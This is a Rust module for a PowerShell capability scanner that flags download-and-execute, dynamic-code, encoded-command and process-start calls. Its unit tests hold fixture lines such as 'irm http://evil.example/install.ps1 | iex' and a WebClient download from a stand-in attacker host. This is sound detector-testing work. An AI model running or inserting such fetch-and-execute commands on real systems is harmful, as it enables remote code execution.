//! PowerShell semantic capability frontend.
//!
//! Structural mirror of `shell_static`: hand-rolled tokenizer (no external
//! parser crate — none exists for PowerShell on crates.io), no taint
//! engine, Module-vs-Function scope only, content-cache wiring, and the
//! `LF-PS-SEMANTIC-INCOMPLETE` fallback pattern. PowerShell has no
//! cross-module reachability graph in this design either: there is no
//! import system to resolve here, only single-file dot-sourcing (`. ./x`),
//! which this frontend does not model.
//!
//! **Corpus-gate write-up (reasoned, not measured — no corpus tooling
//! exists in this sandbox; `scripts/corpus/detector-quality-gate.py` is a
//! regression gate against fixed fixtures, not a measurement tool):**
//! PowerShell is the dominant attack surface for Windows-targeting tooling,
//! and `irm <url> | iex` / `iwr <url> | iex` is a well-documented
//! supply-chain-attack idiom (PowerShell's analog of `curl | bash`). Before
//! this frontend, PowerShell coverage was limited to `scan_text_streaming`'s
//! textual `dangerous` needle table (`LF-PS-INVOKE-EXPRESSION`,
//! `LF-PS-ENCODED-COMMAND`, `LF-PS-DOWNLOAD`), which cannot distinguish an
//! executed command from the same text sitting inside a `#`/`<# #>` comment
//! or a single-quoted string literal. This frontend's tokenizer only
//! classifies bare, unquoted words that occupy an actual command/statement
//! position, which structurally rules out that class of false positive.
//! The textual layer is intentionally left running alongside this frontend
//! (both may fire on the same file); see this module's wiring in
//! `language_frontend.rs`.

pub mod calls;
pub mod findings;
pub mod limits;
pub mod parser;
pub mod symbols;

use anyhow::Result;
use calls::{extract_call_sites, PowerShellCallSite};
use limits::PowerShellAnalysisLimits;
use parser::{parse_powershell_source, PowerShellCoverage, PowerShellSyntaxState};
use std::time::Instant;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct PowerShellAnalysis {
    pub relative_path: String,
    pub syntax_state: PowerShellSyntaxState,
    pub call_sites: Vec<PowerShellCallSite>,
    pub coverage: PowerShellCoverage,
}

/// Content-intrinsic PowerShell facts: tokenizing and call-site extraction
/// over exact source bytes. As with `ShellContentFacts`, there is no
/// contextual (`auto_map_modules`-shaped) piece to exclude: this frontend
/// has no per-package configuration input and the parser never embeds
/// `relative_path` into any error text, so the entire struct is safe to
/// cache and reuse verbatim across paths/packages for identical content.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
struct PowerShellContentFacts {
    syntax_state: PowerShellSyntaxState,
    call_sites: Vec<PowerShellCallSite>,
    coverage: PowerShellCoverage,
}

const POWERSHELL_CONTENT_CACHE_DISCRIMINATOR: &str = "powershell-ast:v1";

fn analyze_content(source: &str, limits: &PowerShellAnalysisLimits) -> PowerShellContentFacts {
    let parsed = parse_powershell_source(source, limits);
    let call_sites = if matches!(parsed.syntax_state, PowerShellSyntaxState::Valid) {
        extract_call_sites(&parsed, limits)
    } else {
        Vec::new()
    };
    PowerShellContentFacts {
        syntax_state: parsed.syntax_state,
        call_sites,
        coverage: parsed.coverage,
    }
}

/// Content facts, from the content cache when eligible and available,
/// otherwise computed fresh (and opportunistically cached for next time).
/// `sha256` must already be a verified content digest for `source`'s exact
/// bytes — never recomputed here.
fn content_facts(
    source: &str,
    sha256: &str,
    limits: &PowerShellAnalysisLimits,
) -> PowerShellContentFacts {
    let size = source.len() as u64;
    if crate::content_cache::eligible(size) {
        if let Ok(Some(cached)) = crate::content_cache::lookup::<PowerShellContentFacts>(
            sha256,
            size,
            POWERSHELL_CONTENT_CACHE_DISCRIMINATOR,
        ) {
            return cached;
        }
        let facts = analyze_content(source, limits);
        let _ = crate::content_cache::store(
            sha256,
            size,
            POWERSHELL_CONTENT_CACHE_DISCRIMINATOR,
            &facts,
        );
        return facts;
    }
    analyze_content(source, limits)
}

pub fn analyze(
    relative_path: &str,
    source: &str,
    sha256: &str,
    limits: &PowerShellAnalysisLimits,
) -> Result<PowerShellAnalysis> {
    let facts = content_facts(source, sha256, limits);
    Ok(PowerShellAnalysis {
        relative_path: relative_path.to_owned(),
        syntax_state: facts.syntax_state,
        call_sites: facts.call_sites,
        coverage: facts.coverage,
    })
}

pub fn analyze_and_convert_findings(
    relative_path: &str,
    source: &str,
    digest: &str,
    limits: &PowerShellAnalysisLimits,
    started: Instant,
) -> Result<Vec<crate::scanner::LayerScanResult>> {
    let analysis = analyze(relative_path, source, digest, limits)?;
    Ok(findings::convert_analysis_to_findings(
        relative_path,
        digest,
        &analysis.syntax_state,
        &analysis.call_sites,
        started,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::script_capability::{ScriptCapability, ScriptScope};

    use crate::content_cache::ENV_TEST_LOCK as ENV_LOCK;

    struct ContentCacheEnvGuard {
        _lock: std::sync::MutexGuard<'static, ()>,
        root: std::path::PathBuf,
    }

    impl ContentCacheEnvGuard {
        fn new(name: &str) -> Self {
            let lock = ENV_LOCK.lock().unwrap_or_else(|poison| poison.into_inner());
            let root = std::env::temp_dir().join(format!(
                "layerfault-powershell-content-cache-{name}-{}-{}",
                std::process::id(),
                crate::paths::now_unix()
            ));
            std::fs::create_dir_all(&root).expect("create cache root");
            std::env::set_var("LAYERFAULT_CACHE_DIR", &root);
            std::env::set_var("LAYERFAULT_CONTENT_CACHE", "on");
            std::env::set_var("LAYERFAULT_CONTENT_CACHE_MIN_BYTES", "0");
            Self { _lock: lock, root }
        }
    }

    impl Drop for ContentCacheEnvGuard {
        fn drop(&mut self) {
            std::env::remove_var("LAYERFAULT_CACHE_DIR");
            std::env::remove_var("LAYERFAULT_CONTENT_CACHE");
            std::env::remove_var("LAYERFAULT_CONTENT_CACHE_MIN_BYTES");
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    #[test]
    fn powershell_content_facts_are_stable_across_cache_round_trip() {
        let _guard = ContentCacheEnvGuard::new("stability");
        let code = "irm http://example.com/install.ps1 | iex\n";
        let limits = PowerShellAnalysisLimits::default();
        let sha256 = "sha256:powershell-content-facts-test";

        let first = analyze("install.ps1", code, sha256, &limits).unwrap();
        let second = analyze("install.ps1", code, sha256, &limits).unwrap();

        assert_eq!(first.call_sites.len(), second.call_sites.len());
        assert_eq!(first.syntax_state, second.syntax_state);
        assert!(first.call_sites.iter().any(|c| c.is_download_execute));
    }

    #[test]
    fn test_builtin_alias_resolution_iex() {
        let code = "iex \"Get-Process\"\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-1", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(res.call_sites.iter().any(|c| {
            c.site.capability == ScriptCapability::DynamicCode
                && c.site.resolved_target.as_deref() == Some("Invoke-Expression")
        }));
    }

    #[test]
    fn test_builtin_alias_resolution_irm_iwr() {
        let limits = PowerShellAnalysisLimits::default();
        let irm = analyze(
            "a.ps1",
            "irm http://example.com/x.ps1\n",
            "sha256:ps-test-2",
            &limits,
        )
        .unwrap();
        assert!(irm.call_sites.iter().any(|c| {
            c.site.capability == ScriptCapability::Network
                && c.site.resolved_target.as_deref() == Some("Invoke-RestMethod")
        }));
        let iwr = analyze(
            "b.ps1",
            "iwr http://example.com/x.ps1\n",
            "sha256:ps-test-3",
            &limits,
        )
        .unwrap();
        assert!(iwr.call_sites.iter().any(|c| {
            c.site.capability == ScriptCapability::Network
                && c.site.resolved_target.as_deref() == Some("Invoke-WebRequest")
        }));
    }

    #[test]
    fn test_set_alias_indirection_resolution() {
        let code = "Set-Alias foo Invoke-Expression\nfoo \"whoami\"\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-4", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(res.call_sites.iter().any(|c| {
            c.site.capability == ScriptCapability::DynamicCode
                && c.site.resolved_target.as_deref() == Some("Invoke-Expression")
        }));
    }

    #[test]
    fn test_scope_classification() {
        let code =
            "Invoke-Expression \"top\"\nfunction My-Func {\n  Invoke-Expression \"inner\"\n}\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-5", &limits).unwrap();
        let module_hits: Vec<_> = res
            .call_sites
            .iter()
            .filter(|c| {
                c.site.capability == ScriptCapability::DynamicCode
                    && c.site.scope == ScriptScope::Module
            })
            .collect();
        let function_hits: Vec<_> = res
            .call_sites
            .iter()
            .filter(|c| {
                c.site.capability == ScriptCapability::DynamicCode
                    && c.site.scope == ScriptScope::Function
            })
            .collect();
        assert_eq!(module_hits.len(), 1);
        assert_eq!(function_hits.len(), 1);
    }

    #[test]
    fn test_comment_and_string_suppression() {
        let code = "# Invoke-Expression 'evil'\n<# Invoke-Expression 'also evil' #>\n$x = 'Invoke-Expression'\nWrite-Output \"Invoke-Expression noted\"\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-6", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(!res
            .call_sites
            .iter()
            .any(|c| c.site.capability == ScriptCapability::DynamicCode));
    }

    #[test]
    fn test_unterminated_here_string_is_invalid() {
        let code = "$x = @\"\nunterminated here-string\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-7", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            PowerShellSyntaxState::Invalid { .. }
        ));
        assert!(matches!(
            res.coverage,
            PowerShellCoverage::Incomplete { .. }
        ));

        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.ps1", code, "sha256:ps-test-8", &limits, started)
                .unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_unterminated_block_comment_is_invalid() {
        let code = "Invoke-Expression 'x'\n<# unterminated block comment\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-9", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            PowerShellSyntaxState::Invalid { .. }
        ));
    }

    #[test]
    fn test_exceeds_max_source_bytes() {
        let code = "Get-Process\n".repeat(10);
        let limits = PowerShellAnalysisLimits {
            max_source_bytes: 4,
            ..Default::default()
        };
        let res = analyze("script.ps1", &code, "sha256:ps-test-10", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            PowerShellSyntaxState::ExceededLimits { .. }
        ));
        let started = Instant::now();
        let findings = analyze_and_convert_findings(
            "script.ps1",
            &code,
            "sha256:ps-test-11",
            &limits,
            started,
        )
        .unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_exceeds_max_tokens() {
        let code = "Get-Process\n".repeat(200);
        let limits = PowerShellAnalysisLimits {
            max_tokens: 10,
            ..Default::default()
        };
        let res = analyze("script.ps1", &code, "sha256:ps-test-12", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            PowerShellSyntaxState::ExceededLimits { .. }
        ));
        let started = Instant::now();
        let findings = analyze_and_convert_findings(
            "script.ps1",
            &code,
            "sha256:ps-test-13",
            &limits,
            started,
        )
        .unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_exceeds_max_nesting_depth() {
        let mut code = String::new();
        for _ in 0..20 {
            code.push_str("if ($true) {\n");
        }
        code.push_str("Get-Process\n");
        for _ in 0..20 {
            code.push_str("}\n");
        }
        let limits = PowerShellAnalysisLimits {
            max_nesting_depth: 5,
            ..Default::default()
        };
        let res = analyze("script.ps1", &code, "sha256:ps-test-14", &limits).unwrap();
        assert!(matches!(
            res.syntax_state,
            PowerShellSyntaxState::ExceededLimits { .. }
        ));
        let started = Instant::now();
        let findings = analyze_and_convert_findings(
            "script.ps1",
            &code,
            "sha256:ps-test-15",
            &limits,
            started,
        )
        .unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-INCOMPLETE"));
    }

    #[test]
    fn test_source_span_evidence_line_number() {
        let code = "Write-Output one\nWrite-Output two\nInvoke-Expression \"danger\"\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-16", &limits).unwrap();
        let dynamic_site = res
            .call_sites
            .iter()
            .find(|c| c.site.capability == ScriptCapability::DynamicCode)
            .expect("dynamic-code call site present");
        assert_eq!(dynamic_site.site.line, Some(3));
    }

    #[test]
    fn test_irm_iex_composite_fires() {
        let code = "irm http://evil.example/install.ps1 | iex\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-17", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(res.call_sites.iter().any(|c| c.is_download_execute));

        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.ps1", code, "sha256:ps-test-18", &limits, started)
                .unwrap();
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-DOWNLOAD-EXECUTE"));
    }

    #[test]
    fn test_irm_alone_does_not_fire_composite() {
        let code = "irm http://example.com/data.json\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-19", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(!res.call_sites.iter().any(|c| c.is_download_execute));
        assert!(res
            .call_sites
            .iter()
            .any(|c| c.site.capability == ScriptCapability::Network));

        let started = Instant::now();
        let findings =
            analyze_and_convert_findings("script.ps1", code, "sha256:ps-test-20", &limits, started)
                .unwrap();
        assert!(!findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-DOWNLOAD-EXECUTE"));
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-PS-SEMANTIC-NETWORK"));
    }

    #[test]
    fn test_webclient_download_string_via_new_object() {
        let code = "$client = New-Object System.Net.WebClient\n$client.DownloadString('http://evil.example/x.ps1')\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-21", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(res.call_sites.iter().any(|c| {
            c.site.capability == ScriptCapability::Network
                && c.site
                    .resolved_target
                    .as_deref()
                    .unwrap_or_default()
                    .contains("WebClient")
        }));
    }

    #[test]
    fn test_static_process_start() {
        let code = "[System.Diagnostics.Process]::Start('cmd.exe', '/c whoami')\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-22", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        assert!(res
            .call_sites
            .iter()
            .any(|c| c.site.capability == ScriptCapability::Process));
    }

    #[test]
    fn test_encoded_command_bumps_confidence() {
        let code = "powershell.exe -EncodedCommand SQBFAFgA\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-23", &limits).unwrap();
        assert_eq!(res.syntax_state, PowerShellSyntaxState::Valid);
        let site = res
            .call_sites
            .iter()
            .find(|c| c.has_encoded_command)
            .expect("encoded-command call site present");
        assert_eq!(
            site.site.confidence,
            crate::script_capability::ScriptConfidence::High
        );
    }

    #[test]
    fn test_add_type_double_classification() {
        let code = "Add-Type -TypeDefinition 'public class X {}'\n";
        let limits = PowerShellAnalysisLimits::default();
        let res = analyze("script.ps1", code, "sha256:ps-test-24", &limits).unwrap();
        assert!(res
            .call_sites
            .iter()
            .any(|c| c.site.capability == ScriptCapability::DynamicCode));
        assert!(res
            .call_sites
            .iter()
            .any(|c| c.site.capability == ScriptCapability::NativeLoad));
    }
}
